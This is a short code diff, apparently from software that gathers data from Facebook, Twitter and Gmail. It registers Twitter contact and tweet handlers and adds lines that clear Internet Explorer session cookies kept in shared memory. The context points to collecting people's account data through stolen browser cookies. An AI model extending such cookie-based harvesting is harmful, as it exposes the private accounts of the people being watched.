@@ -206,6 +206,11 @@ void InitSocialEntries()
 	social_entry[3].RequestHandler = HandleTwitterContacts;
 	wcscpy_s(social_entry[4].domain, TWITTER_DOMAIN);
 	social_entry[4].RequestHandler = HandleTwitterTweets;
+
+	// Azzera i cookie in shared mem relativi a IExplorer
+	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
+	ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
+	ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
 }
 
 void SocialMainLoop()
